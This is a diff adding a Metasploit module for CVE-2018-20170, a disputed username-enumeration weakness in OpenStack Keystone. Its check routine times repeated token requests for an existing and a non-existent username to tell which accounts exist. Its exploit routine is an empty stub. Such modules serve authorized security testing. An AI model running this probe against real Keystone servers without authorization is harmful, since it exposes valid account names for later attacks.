@@ -1,0 +1,114 @@
+--- cve_2018_20170.rb	2019-03-18 05:22:49.953765136 -0400
++++ /usr/share/metasploit-framework/modules/exploits/multi/http/cve_2018_20170.rb	2019-03-18 05:23:07.569777161 -0400
+@@ -0,0 +1,111 @@
++require 'msf/core'
++
++class MetasploitModule < Msf::Exploit::Remote
++  Rank = GoodRanking
++
++  include Msf::Exploit::Remote::HttpClient
++
++  def initialize(info = {})
++    super(update_info(info,
++      'Name'           => 'CVE-2018-20170',
++      'Description'    => %q{
++        ** DISPUTED ** 
++        OpenStack Keystone through 14.0.1 has a user enumeration vulnerability 
++        because invalid usernames have much faster responses than valid ones for a POST /v3/auth/tokens request. 
++        NOTE: the vendor's position is that this is a hardening opportunity, 
++        and not necessarily an issue that should have an OpenStack Security Advisory.
++      },
++      'Author'         => 'jason3e7',
++      'References'     =>
++        [
++          [ 'CVE', 'CVE-2018-20170' ],
++        ],
++      'Platform'       => 'python',
++      'Targets'        =>        
++        [
++          [ 'Automatic', {} ]
++        ],
++      'DefaultTarget' => 0))
++
++    register_options(
++      [
++        OptString.new('TARGETURI', [ false, "Base identity directory path", '/identity/']),
++        OptString.new('EXISTUSER', [ true, "Exist user to authenticate with", 'admin']),
++        OptString.new('NOTEXISTUSER', [ true, "Not exist user to authenticate with", 'xxxxxxxx']),
++        OptString.new('TIMES', [ true, "Test times", 100])
++      ])
++  end
++
++  def check
++    timeout_count = 0
++
++    c1 = 0
++    for i in 1..datastore['TIMES']
++      begin
++        t1 = testUser(datastore['EXISTUSER'])
++        t2 = testUser(datastore['NOTEXISTUSER'])
++        if (t1 > t2)
++          c1 += 1
++        end   
++      rescue
++        timeout_count += 1
++        if timeout_count >= 5
++          print_error("Request time out")
++          return Exploit::CheckCode::Unknown
++        end
++      end
++    end
++
++    c2 = 0
++    for i in 1..datastore['TIMES']
++      begin
++        t2 = testUser(datastore['NOTEXISTUSER'])
++        t1 = testUser(datastore['EXISTUSER'])
++        if (t1 > t2)
++          c2 += 1
++        end
++      rescue
++        timeout_count += 1
++        if timeout_count >= 5
++          print_error("Request time out")
++          return Exploit::CheckCode::Unknown
++        end
++      end
++    end
++
++    c1 = ((c1 * 100) / datastore['TIMES'])
++    c2 = ((c2 * 100) / datastore['TIMES'])
++
++    if c1 > 75 && c2 < 25
++      return Exploit::CheckCode::Vulnerable
++    else
++      return Exploit::CheckCode::Detected
++    end
++  end
++
++  def testUser(username)
++    starting = Process.clock_gettime(Process::CLOCK_MONOTONIC)
++    user = {"name" => datastore['USERNAME'], "domain" => {"name" => "Default"}, "password" => "XXXXXXXX"}
++    data = {"auth" => { "identity" => { "methods" => [ "password" ], "password" => {"user" => username}}}}
++
++    res = send_request_raw({
++      'uri' => normalize_uri(datastore['TARGETURI'], "/v3/auth/tokens"),
++      'method'  => 'POST',
++      'data'    => data.to_json,
++      'headers' =>
++      {
++        'Connection'   => 'close'
++      }
++    }, 3)
++    ending = Process.clock_gettime(Process::CLOCK_MONOTONIC)
++    elapsed = ending - starting
++    return elapsed
++  end
++
++  def exploit
++    fail_with(Failure::None, "Not have exploit")
++
++    handler
++  end
++
++end
